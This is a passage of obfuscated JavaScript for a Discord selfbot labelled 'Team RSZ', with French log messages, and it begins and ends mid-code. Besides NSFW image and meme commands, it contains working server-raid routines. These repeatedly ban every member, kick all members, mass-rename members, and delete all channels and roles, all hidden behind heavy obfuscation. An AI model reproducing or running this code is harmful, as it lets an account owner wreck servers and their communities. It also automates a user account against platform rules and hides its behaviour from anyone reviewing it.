(_0x57e84f)[_0x8a5b4f(0x4d5)](_0x2e6077=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x61f)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x540)){if(!_0x5e9f52[_0x8a5b4f(0x5e1)])return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x1ff));const _0x1232db=new Date()[_0x8a5b4f(0x39d)]()-_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x388)][_0x8a5b4f(0x39d)](),_0x1fd8ec=_0x1232db/0x3e8/0x3c/0x3c/0x18,_0x312b79=[_0x8a5b4f(0x337),_0x8a5b4f(0x224),_0x8a5b4f(0x382),_0x8a5b4f(0x28a),'Extreme'];let _0x35081f=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x4ea)](_0x8a5b4f(0x1f7))[_0x8a5b4f(0x463)](_0x8a5b4f(0x5df),''+_0x5e9f52['guild'][_0x8a5b4f(0x47a)])[_0x8a5b4f(0x463)](_0x8a5b4f(0x572),_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x388)][_0x8a5b4f(0x6db)]()[_0x8a5b4f(0x5d7)](0x0,0xf)+',\x0a'+checkDays(_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x388)]),!![])[_0x8a5b4f(0x463)](_0x8a5b4f(0x447),''+_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2d9)])['addField']('Region:',''+_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x4a0)])[_0x8a5b4f(0x463)](_0x8a5b4f(0x5f8),_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)]['filter'](_0x1a572a=>_0x1a572a[_0x8a5b4f(0x594)]['status']!=='offline')[_0x8a5b4f(0x3ed)]+'\x20/\x20'+_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2a2)])['addField']('Owner:',''+_0x35b0b3['guild'][_0x8a5b4f(0x238)][_0x8a5b4f(0x377)][_0x8a5b4f(0x587)])['addField']('Text\x20Channels',''+_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)][_0x8a5b4f(0x508)](_0x5e94f0=>_0x5e94f0[_0x8a5b4f(0x661)]===_0x8a5b4f(0x261))[_0x8a5b4f(0x3ed)])[_0x8a5b4f(0x463)]('Voice\x20Channels',''+_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)][_0x8a5b4f(0x508)](_0x2989e5=>_0x2989e5[_0x8a5b4f(0x661)]===_0x8a5b4f(0x39a))['size'])[_0x8a5b4f(0x463)](_0x8a5b4f(0x6cf),''+_0x312b79[_0x5e9f52[_0x8a5b4f(0x5e1)]['verificationLevel']])[_0x8a5b4f(0x463)](_0x8a5b4f(0x57b),''+_0x5e9f52['guild'][_0x8a5b4f(0x5b3)]['size'])[_0x8a5b4f(0x463)](_0x8a5b4f(0x2c6),''+_0x5e9f52[_0x8a5b4f(0x5e1)]['id'])[_0x8a5b4f(0x39b)](color);_0x5e9f52[_0x8a5b4f(0x5e1)]['iconURL']!=null&&_0x35081f['setThumbnail'](''+_0x5e9f52[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x563)]),_0x5e9f52[_0x8a5b4f(0x26f)](_0x35081f)[_0x8a5b4f(0x4d5)](_0x27bacb=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4e5)),console['log'](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x26a)){let _0x4973c3=new Discord[(_0x8a5b4f(0x2e8))]();_0x4973c3[_0x8a5b4f(0x279)]()['setColor'](color)[_0x8a5b4f(0x4ea)]('**Selfbot\x20Statistics**')[_0x8a5b4f(0x463)]('Mem\x20Usage:',(process[_0x8a5b4f(0x44d)]()['heapUsed']/0x400/0x400)['toFixed'](0x2)+'MB')[_0x8a5b4f(0x463)](_0x8a5b4f(0x576),''+client[_0x8a5b4f(0x5be)][_0x8a5b4f(0x3ed)])['addField'](_0x8a5b4f(0x64e),''+client[_0x8a5b4f(0x2e6)][_0x8a5b4f(0x3ed)])['addField']('Users:',''+client['guilds'][_0x8a5b4f(0x216)](_0x9fa00d=>_0x9fa00d[_0x8a5b4f(0x2a2)]))[_0x8a5b4f(0x463)](_0x8a5b4f(0x576),''+client[_0x8a5b4f(0x5be)][_0x8a5b4f(0x3ed)])[_0x8a5b4f(0x463)](_0x8a5b4f(0x576),''+client[_0x8a5b4f(0x5be)][_0x8a5b4f(0x3ed)])[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3),''+client['user']['avatarURL']);if(client['user']['premium']>0x0)_0x4973c3['addField']('•\x20Nitro',_0x8a5b4f(0x522));else _0x4973c3[_0x8a5b4f(0x463)]('•\x20Nitro',_0x8a5b4f(0x35c));_0x35b0b3[_0x8a5b4f(0x26f)](_0x4973c3)['catch'](_0x20b16d=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x1f4)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x1fc))&&(superagent[_0x8a5b4f(0x283)](_0x8a5b4f(0x1e9))[_0x8a5b4f(0x37b)]({'type':_0x8a5b4f(0x1fc)})[_0x8a5b4f(0x350)]((_0x230f5b,_0x2b9eb5)=>{const _0x4614b1=_0x8a5b4f;var _0x3bf3a5=new Discord[(_0x4614b1(0x2e8))]()[_0x4614b1(0x39b)](color)[_0x4614b1(0x248)](_0x4614b1(0x4f3))['setTimestamp']()[_0x4614b1(0x6ae)](_0x2b9eb5[_0x4614b1(0x60b)]['message'])[_0x4614b1(0x39b)](color);_0x5e9f52[_0x4614b1(0x26f)](_0x3bf3a5)[_0x4614b1(0x4d5)](_0x6ebdfc=>console[_0x4614b1(0x32b)]('[',_0x4614b1(0x391)[_0x4614b1(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x4614b1(0x55b)]));}),console['log'](_0x8a5b4f(0x34b)),console['log'](_0x8a5b4f(0x59d)));_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'4k')&&superagent[_0x8a5b4f(0x283)](_0x8a5b4f(0x1e9))[_0x8a5b4f(0x37b)]({'type':'4k'})[_0x8a5b4f(0x350)]((_0x56c202,_0x598e47)=>{const _0x1b4dd6=_0x8a5b4f;var _0x20f91d=new Discord[(_0x1b4dd6(0x2e8))]()[_0x1b4dd6(0x248)](_0x1b4dd6(0x4f3))[_0x1b4dd6(0x279)]()[_0x1b4dd6(0x6ae)](_0x598e47['body'][_0x1b4dd6(0x28e)])[_0x1b4dd6(0x39b)](color);_0x5e9f52[_0x1b4dd6(0x26f)](_0x20f91d)[_0x1b4dd6(0x4d5)](_0x79b09f=>console['log']('[',_0x1b4dd6(0x391)[_0x1b4dd6(0x5fb)],']',_0x1b4dd6(0x41a)['green'])),console[_0x1b4dd6(0x32b)](_0x1b4dd6(0x27d)),console[_0x1b4dd6(0x32b)]('╟─────────────────────────────────╢');});if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'nsfw-gif')){var _0x1ba4e7=new Discord[(_0x8a5b4f(0x2e8))]();superagent[_0x8a5b4f(0x283)]('')['query']({'type':_0x8a5b4f(0x3cd)})['end']((_0x4e5afb,_0x139147)=>{const _0x34cff7=_0x8a5b4f;var _0x6d1e3e=new Discord['RichEmbed']()[_0x34cff7(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x34cff7(0x279)]()[_0x34cff7(0x6ae)](_0x139147[_0x34cff7(0x60b)]['message'])[_0x34cff7(0x39b)](color);_0x5e9f52[_0x34cff7(0x26f)](_0x6d1e3e)['catch'](_0x5916cb=>console[_0x34cff7(0x32b)]('[','ERROR'[_0x34cff7(0x5fb)],']',_0x34cff7(0x41a)['green'])),console['log'](_0x34cff7(0x52e)),console[_0x34cff7(0x32b)](_0x34cff7(0x59d));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x20d))){var _0x54432d=new Discord[(_0x8a5b4f(0x2e8))]();superagent[_0x8a5b4f(0x283)](_0x8a5b4f(0x1e9))[_0x8a5b4f(0x37b)]({'type':'hentai_anal'})[_0x8a5b4f(0x350)]((_0x4026fe,_0x5aa203)=>{const _0x52026a=_0x8a5b4f;var _0x434c2d=new Discord[(_0x52026a(0x2e8))]()[_0x52026a(0x248)](_0x52026a(0x4f3))[_0x52026a(0x279)]()['setImage'](_0x5aa203[_0x52026a(0x60b)][_0x52026a(0x28e)])['setColor'](color);_0x5e9f52['edit'](_0x434c2d)[_0x52026a(0x4d5)](_0x48629b=>console[_0x52026a(0x32b)]('[',_0x52026a(0x391)[_0x52026a(0x5fb)],']',_0x52026a(0x41a)[_0x52026a(0x55b)])),console['log'](_0x52026a(0x308)),console['log'](_0x52026a(0x59d));});}_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+'pussy')&&superagent['get'](_0x8a5b4f(0x1e9))[_0x8a5b4f(0x37b)]({'type':_0x8a5b4f(0x4a9)})[_0x8a5b4f(0x350)]((_0x19c0bc,_0x24b9a2)=>{const _0x2774a5=_0x8a5b4f;var _0x2b2822=new Discord['RichEmbed']()[_0x2774a5(0x248)](_0x2774a5(0x4f3))[_0x2774a5(0x279)]()[_0x2774a5(0x6ae)](_0x24b9a2[_0x2774a5(0x60b)][_0x2774a5(0x28e)])[_0x2774a5(0x39b)](color);_0x5e9f52[_0x2774a5(0x26f)](_0x2b2822)[_0x2774a5(0x4d5)](_0x3eb3e0=>console[_0x2774a5(0x32b)]('[','ERROR'['red'],']',_0x2774a5(0x41a)[_0x2774a5(0x55b)])),console[_0x2774a5(0x32b)]('╟\x20Commande\x20pussy\x20executé'),console[_0x2774a5(0x32b)](_0x2774a5(0x59d));});_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x3af))&&superagent[_0x8a5b4f(0x283)](_0x8a5b4f(0x1e9))[_0x8a5b4f(0x37b)]({'type':_0x8a5b4f(0x3af)})['end']((_0x2f0d3d,_0x4197e8)=>{const _0x1cb27d=_0x8a5b4f;var _0xf64744=new Discord[(_0x1cb27d(0x2e8))]()[_0x1cb27d(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x1cb27d(0x279)]()[_0x1cb27d(0x6ae)](_0x4197e8[_0x1cb27d(0x60b)][_0x1cb27d(0x28e)])[_0x1cb27d(0x39b)](color);_0x5e9f52['edit'](_0xf64744)[_0x1cb27d(0x4d5)](_0xb88b8c=>console[_0x1cb27d(0x32b)]('[',_0x1cb27d(0x391)[_0x1cb27d(0x5fb)],']',_0x1cb27d(0x41a)[_0x1cb27d(0x55b)])),console[_0x1cb27d(0x32b)](_0x1cb27d(0x487)),console['log']('╟─────────────────────────────────╢');});_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x3de))&&superagent['get']('https://nekobot.xyz/api/image')['query']({'type':_0x8a5b4f(0x3de)})[_0x8a5b4f(0x350)]((_0x189c7c,_0x3c6bce)=>{const _0x40f427=_0x8a5b4f;var _0x4da1bd=new Discord[(_0x40f427(0x2e8))]()[_0x40f427(0x248)](_0x40f427(0x4f3))[_0x40f427(0x279)]()[_0x40f427(0x6ae)](_0x3c6bce['body']['message'])[_0x40f427(0x39b)](color);_0x5e9f52[_0x40f427(0x26f)](_0x4da1bd)[_0x40f427(0x4d5)](_0x156ea6=>console[_0x40f427(0x32b)]('[',_0x40f427(0x391)['red'],']',_0x40f427(0x41a)[_0x40f427(0x55b)])),console[_0x40f427(0x32b)](_0x40f427(0x44f)),console[_0x40f427(0x32b)](_0x40f427(0x59d));});if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x5bb))){if(!_0x1f6d08)return _0x5e9f52['edit'](_0x8a5b4f(0x6dd));var _0x557161=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)['setFooter']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')['setTitle'](_0x1f6d08[_0x8a5b4f(0x587)]+_0x8a5b4f(0x441)+client['user'][_0x8a5b4f(0x587)])[_0x8a5b4f(0x6ae)](_0x8a5b4f(0x6dc));_0x35b0b3[_0x8a5b4f(0x26f)](_0x557161)[_0x8a5b4f(0x4d5)](_0x1b2bba=>console['log']('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4d6)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x492))){if(!_0x1f6d08)return _0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x6dd));var _0x28dd2e=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))['setTitle'](_0x1f6d08[_0x8a5b4f(0x587)]+_0x8a5b4f(0x5e5)+client[_0x8a5b4f(0x377)][_0x8a5b4f(0x587)])['setImage']('\x09');_0x35b0b3[_0x8a5b4f(0x26f)](_0x28dd2e)['catch'](_0x53312f=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)['green'])),console['log'](_0x8a5b4f(0x65d)),console['log'](_0x8a5b4f(0x59d));}_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'shutdown'&&(_0x5e9f52['delete']()['then'](()=>process[_0x8a5b4f(0x5a1)](0x1)),console['log']('╟\x20Le\x20selfbot\x20est\x20eteint'),console['log']('╟─────────────────────────────────╢'));if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+'kick')){let _0x3a2f2f=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x3a2f2f){_0x35b0b3['edit'](_0x8a5b4f(0x49d));return;}if(!_0x1f6d08){_0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Veuillez\x20mentionner\x20un\x20utilisateur!**');return;}_0x1f6d08[_0x8a5b4f(0x36d)]()[_0x8a5b4f(0x1d9)](_0xa0aa90=>{const _0x445aae=_0x8a5b4f;_0x35b0b3[_0x445aae(0x26f)](_0x445aae(0x3d9)+_0xa0aa90[_0x445aae(0x474)]+'\x20has\x20been\x20successfully\x20kicked\x20:point_right:\x20');})[_0x8a5b4f(0x4d5)](()=>{const _0x542b71=_0x8a5b4f;_0x35b0b3['edit'](_0x542b71(0x37a));}),console['log'](_0x8a5b4f(0x21a)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x3ad))){let _0x40ed83=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x40ed83){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x49d));return;}if(!_0x1f6d08){_0x35b0b3['edit'](_0x8a5b4f(0x650));return;}_0x1f6d08[_0x8a5b4f(0x3ad)]()[_0x8a5b4f(0x1d9)](_0x17219f=>{const _0x3e06a8=_0x8a5b4f;_0x35b0b3[_0x3e06a8(0x26f)](_0x3e06a8(0x3d9)+_0x17219f[_0x3e06a8(0x474)]+_0x3e06a8(0x5e0));})[_0x8a5b4f(0x4d5)](()=>{const _0x16370a=_0x8a5b4f;_0x35b0b3[_0x16370a(0x26f)](_0x16370a(0x37a));}),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20ban\x20executé'),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x2b6))){let _0x5db0fe=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x5db0fe)return _0x5e9f52['edit'](_0x8a5b4f(0x1ff));const _0x5a1715=_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x534)]('\x20')[_0x8a5b4f(0x65a)](0x2)[_0x8a5b4f(0x565)]('\x20')||_0x35b0b3['author'][_0x8a5b4f(0x587)];if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x29b)))return _0x35b0b3['delete']()[_0x8a5b4f(0x1d9)](console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x42a)[_0x8a5b4f(0x55b)]));const _0xf6144e=_0x35b0b3[_0x8a5b4f(0x5e1)]['members'];_0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x683)+_0x5a1715),_0xf6144e[_0x8a5b4f(0x1e7)](_0x1c3873=>{const _0x2af88e=_0x8a5b4f;_0x1c3873[_0x2af88e(0x481)](_0x5a1715)[_0x2af88e(0x4d5)](_0x3e8db7=>console[_0x2af88e(0x32b)]('[',_0x2af88e(0x391)[_0x2af88e(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x2af88e(0x55b)]));}),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20name\x20all\x20executé'),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x517)){let _0x4d55b9=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x4d55b9)return _0x5e9f52[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20un\x20serveur**');if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x46a)))return _0x35b0b3[_0x8a5b4f(0x246)]()[_0x8a5b4f(0x1d9)](console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x42a)[_0x8a5b4f(0x55b)]));_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)][_0x8a5b4f(0x1e7)](_0x25bf97=>{setInterval(()=>{const _0x136be9=_0x5e0d;if(!_0x25bf97['bannable'])return;_0x25bf97[_0x136be9(0x3ad)]()['catch'](_0x251e90=>console[_0x136be9(0x32b)]('[',_0x136be9(0x391)[_0x136be9(0x5fb)],']',_0x136be9(0x41a)[_0x136be9(0x55b)]));},0x3e8);}),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x53a)),console['log'](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x61a)){let _0x4bade9=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x4bade9)return _0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x1ff));if(!_0x35b0b3['member'][_0x8a5b4f(0x554)](_0x8a5b4f(0x2dd)))return _0x35b0b3[_0x8a5b4f(0x246)]()[_0x8a5b4f(0x1d9)](console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x42a)[_0x8a5b4f(0x55b)]));const _0x4ffced=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)];_0x4ffced[_0x8a5b4f(0x1e7)](_0x27afeb=>{const _0xe3b5c6=_0x8a5b4f;if(!_0x27afeb[_0xe3b5c6(0x39c)])return;_0x27afeb[_0xe3b5c6(0x36d)]()['catch'](_0xf11eb0=>console[_0xe3b5c6(0x32b)]('[','ERROR'[_0xe3b5c6(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0xe3b5c6(0x55b)]));}),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x401)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+'purge')&&(_0x35b0b3['channel']['fetchMessages']()[_0x8a5b4f(0x1d9)](_0x44fe21=>_0x44fe21['forEach'](_0x517f4b=>{const _0x2b2f34=_0x8a5b4f;_0x517f4b[_0x2b2f34(0x42b)]['id']===client['user']['id']&&_0x517f4b['delete']()[_0x2b2f34(0x4d5)](_0x471caa=>console[_0x2b2f34(0x32b)]('[',_0x2b2f34(0x391)[_0x2b2f34(0x5fb)],']',_0x2b2f34(0x41a)[_0x2b2f34(0x55b)]));})),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20purge\x20executé'),console['log']('╟─────────────────────────────────╢'));if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x2cb)){let _0x25e216=new Discord[(_0x8a5b4f(0x2e8))]();_0x25e216[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)]('**'+client[_0x8a5b4f(0x377)]['username']+_0x8a5b4f(0x313))[_0x8a5b4f(0x279)]()[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x6ae)](rire[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*rire[_0x8a5b4f(0x3f6)])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0x25e216)[_0x8a5b4f(0x4d5)](_0x3d2f39=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x6b3)),console['log'](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'kiss')){if(!_0x1f6d08){_0x35b0b3['edit'](':x:\x20**Veuillez\x20mentionner\x20un\x20utilisateur!**');return;}let _0x46ba07=new Discord['RichEmbed']();_0x46ba07['setColor'](color)[_0x8a5b4f(0x4ea)]('**'+client['user'][_0x8a5b4f(0x587)]+_0x8a5b4f(0x585)+_0x1f6d08[_0x8a5b4f(0x587)]+'**')[_0x8a5b4f(0x279)]()[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x6ae)](kiss[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*kiss[_0x8a5b4f(0x3f6)])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0x46ba07)[_0x8a5b4f(0x4d5)](_0x29c0ca=>console['log']('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20kiss\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x443))){let _0x57038d=new Discord[(_0x8a5b4f(0x2e8))]();_0x57038d[_0x8a5b4f(0x39b)](color)['setTitle']('**'+client['user'][_0x8a5b4f(0x587)]+'\x20rougit!**')['setTimestamp']()['setFooter']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x8a5b4f(0x6ae)](veski[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*veski[_0x8a5b4f(0x3f6)])]),_0x35b0b3['edit'](_0x57038d)[_0x8a5b4f(0x4d5)](_0x35ed3a=>console['log']('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20blush\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x310))){_0x35b0b3[_0x8a5b4f(0x246)]();var _0x8442f0='▓',_0x4b2158='█';_0x35b0b3[_0x8a5b4f(0x396)]['send'](_0x8a5b4f(0x2df)+_0x8442f0[_0x8a5b4f(0x43d)](0x19)+_0x8a5b4f(0x207))[_0x8a5b4f(0x1d9)](_0x1f8776=>{const _0x2e0fd0=_0x8a5b4f;for(_0x5ef861=0x0;_0x5ef861<=0x19;_0x5ef861++){_0x1f8776['edit']('```['+_0x4b2158[_0x2e0fd0(0x43d)](_0x5ef861)+_0x8442f0[_0x2e0fd0(0x43d)](0x19-_0x5ef861)+_0x2e0fd0(0x25a)+_0x5ef861*0x32/0x19+'%\x0a'+_0x2e0fd0(0x316));}_0x1f8776[_0x2e0fd0(0x26f)](_0x2e0fd0(0x658))[_0x2e0fd0(0x4d5)](_0x8afce2=>console['log']('[',_0x2e0fd0(0x391)[_0x2e0fd0(0x5fb)],']',_0x2e0fd0(0x41a)[_0x2e0fd0(0x55b)])),console[_0x2e0fd0(0x32b)](_0x2e0fd0(0x58e)),console['log']('╟─────────────────────────────────╢');});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'delete\x20all\x20channel'){let _0x5d7fd6=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x5d7fd6){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x67e));return;}if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x4e9)))return _0x35b0b3['delete']()[_0x8a5b4f(0x1d9)](console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']','permission\x20insuffisante'[_0x8a5b4f(0x55b)]));var _0x490989=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)];_0x490989[_0x8a5b4f(0x1e7)](_0x1e7973=>{const _0x4b4b7a=_0x8a5b4f;_0x1e7973[_0x4b4b7a(0x246)]()['catch'](_0x47b21a=>console[_0x4b4b7a(0x32b)]('[','ERROR'[_0x4b4b7a(0x5fb)],']',_0x4b4b7a(0x41a)[_0x4b4b7a(0x55b)]));}),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20delete\x20all\x20channel\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'delete\x20all\x20role'){let _0x5ddb4a=_0x5e9f52[_0x8a5b4f(0x5e1)];if(!_0x5ddb4a){_0x35b0b3['edit'](':x:\x20**Veuillez\x20executer\x20cette\x20commande\x20sur\x20un\x20serveur!**');return;}_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x5b3)]['forEach'](_0x15a0d6=>{const _0x134823=_0x8a5b4f;_0x15a0d6['delete']()[_0x134823(0x4d5)](_0x31e91b=>console[_0x134823(0x32b)]('[',_0x134823(0x391)[_0x134823(0x5fb)],']',_0x134823(0x41a)[_0x134823(0x55b)]));}),console['log'](_0x8a5b4f(0x603)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x442))){if(!_0x1f6d08){_0x35b0b3['edit'](_0x8a5b4f(0x650));return;}let _0xa8b3ac=new Discord[(_0x8a5b4f(0x2e8))]();_0xa8b3ac['setColor'](color)['setTitle']('**'+client[_0x8a5b4f(0x377)]['username']+'\x20frappe\x20'+_0x1f6d08[_0x8a5b4f(0x587)]+'**')[_0x8a5b4f(0x279)]()['setFooter'](_0x8a5b4f(0x4f3))['setImage'](punch[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*punch[_0x8a5b4f(0x3f6)])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0xa8b3ac)[_0x8a5b4f(0x4d5)](_0xb65cb7=>console['log']('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console['log'](_0x8a5b4f(0x259)),console['log'](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x468))){if(!_0x1f6d08){_0x35b0b3['edit'](_0x8a5b4f(0x650));return;}let _0x439a18=new 